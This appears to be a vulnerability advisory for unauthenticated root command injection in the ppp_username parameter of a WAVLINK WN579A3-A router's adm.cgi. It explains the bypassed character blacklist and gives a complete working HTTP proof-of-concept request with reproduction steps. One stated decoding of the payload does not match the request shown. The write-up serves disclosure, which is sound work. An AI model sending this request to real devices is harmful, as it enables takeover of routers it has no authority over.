# WAVLINK WN579A3-A firmware build 2026-03-10 (94f93d4): Unauthenticated command injection vulnerability in adm.cgi wan via ppp_username leading to root RCE

## TARGET

- Device: WAVLINK WN579A3-A Router (MT7628)  
- Firmware version : WINSTAR_WN579A3-A-2026-03-10-94f93d4 

## BUG TYPE

 Command Execution Vulnerability

## Affected Environment

- SoC: MediaTek MT7628 (MIPS 24Kc, OpenWrt ramips)
- OS: OpenWrt Chaos Calmer 15.05.1, kernel 3.10.108
- Web: LuCI git-22.308.13369-94f93d4 / lighttpd 1.4.45
- CGI: `/cgi-bin/adm.cgi` (chrooted in the rootfs)

## **Abstract**

The WAVLINK WL-WN579A3-A router contains a command injection vulnerability in the `set_wan` function within the `/cgi-bin/adm.cgi` CGI program. This vulnerability specifically occurs during the processing of the `ppp_username` parameter. Due to insufficient input validation and inadequate filtering of user-controllable parameters, attackers can inject system commands into the `ppp_username` parameter through specially crafted malicious requests. By exploiting this vulnerability, unauthorized attackers can execute arbitrary system commands as root during the initial setup wizard state (`UserInit=0`). Moreover, the `set_wan` handler does not flip the wizard completion flag `UserInit` to `12`, so the injection can be repeated continuously without authentication.

### Vulnerability Point

When `page=wan`, execution enters `sub_401710`.

<img width="693" height="170" alt="图片" src="https://github.com/user-attachments/assets/6de0dd4a-03f4-4b87-8106-93df5f928693" />


With `Wan0T=3` the pppoe branch is entered, and with `RussianPPPoE_flag=1` the flow reaches the sink:

<img width="1255" height="872" alt="图片" src="https://github.com/user-attachments/assets/a44753c4-2b57-4069-8224-8376b3ce8248" />


<img width="1493" height="609" alt="图片" src="https://github.com/user-attachments/assets/c756224a-fdd1-4edd-baf2-69e9988248b2" />


**Here, only the semicolon `;` is checked.**

<img width="966" height="408" alt="图片" src="https://github.com/user-attachments/assets/b7dfe729-86cd-470c-96f5-31b6a0cf2e22" />


**The `RussianPPPoE_flag` must be set to `"1"` in order to reach the vulnerable code path.**

<img width="1281" height="488" alt="图片" src="https://github.com/user-attachments/assets/7e6dd13e-22da-47eb-9b8f-3e749fcb4950" />


**Here, `sub_40A93C` is called to check whether the string contains the pipe character `|` or the backtick ```.**

<img width="761" height="586" alt="图片" src="https://github.com/user-attachments/assets/4c2ad645-4231-4497-9c6b-74c3785611f5" />


**After passing the check, it enters `sub_408610`.**

<img width="996" height="240" alt="图片" src="https://github.com/user-attachments/assets/ec34e982-935f-4f95-9d4e-68ea80f374fb" />


**Finally, command injection can be constructed.**



The `ppp_username` / `ppp_passwd` parameters are only checked for `;` (via `strchr(..., 59)`), and the whole command then passes through the blacklist `sub_40A93C` which only blocks `|` and backticks. The `$(...)` command substitution contains none of these characters, so it is executed inside the double quotes.

Since the blacklist does not filter `$(`, `)`, etc., an attacker can craft a command injection payload and achieve root RCE.

This requires the device to be in the initial setup wizard state: when `option UserInit` in `/etc/config/winstar` is `0`, unauthenticated RCE is possible.

The `set_wan` handler does not write `UserInit` (unlike the wzdgwMesh / wzdap / wzdrepeater handlers which flip it to `12`), so the wizard gate `(Popup==1 && UserInit!=12)` stays open and the injection can be repeated continuously without resetting the flag.

### PoC

```
POST /cgi-bin/adm.cgi HTTP/1.1

Host: 192.168.10.2

Content-Length: 224

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.10.2

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://ap.setup/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



page=wan&Wan0T=3&RussianPPPoE_flag=1&Second_wan_value=DHCP&ppp_username=%24%28echo%20ROOT_SHELL%20%3E%20%2Ftest%29&ppp_passwd=x&PPP_DNSONOFF=0&Igmp_proxy_value=0&ppp_mtu=1492&ppp_optime=0&dyna_WANDNS_PPP=&dyna_WANDNS2_PPP=
```

The payload `%24%28echo%20WAN_PWN%20%3E%20%2Fpwned_wan%29` URL-decodes to `$(echo WAN_PWN > /pwned_wan)` — a command substitution that executes inside double quotes.

### Impact

In the initial setup wizard state (fresh out-of-box or after factory reset, `UserInit=0`, `Popup=1`), an attacker without any authentication or cookie can execute arbitrary commands as **root** on the router. Because the `set_wan` handler never closes the wizard gate, a single initialization allows unlimited repeated unauthenticated injection, which is convenient for sustained interactive takeover.

### Reproduction

**Prerequisites**

1. The device is in the initial setup wizard state: `option UserInit '0'` and `option Popup 1` in `/etc/config/winstar`
2. The `set_wan` handler does not flip `UserInit`, so the gate stays open for repeated injection

**Reproduction Steps**

1. (Required only before the first injection if the device was already initialized) Reset the wizard flag on the device:

   **Let's simulate it before proceeding.**
   
<img width="1488" height="600" alt="图片" src="https://github.com/user-attachments/assets/4616c5ed-75b0-4137-a6f6-43b1d1850f36" />


**Before sending the payload**

<img width="2109" height="931" alt="图片" src="https://github.com/user-attachments/assets/f58cebcf-7cfd-4522-8db1-bb79f76fc3f4" />


**After sending the payload**

<img width="1610" height="747" alt="图片" src="https://github.com/user-attachments/assets/7567657e-dc54-4e2e-be7a-3ca2df325056" />

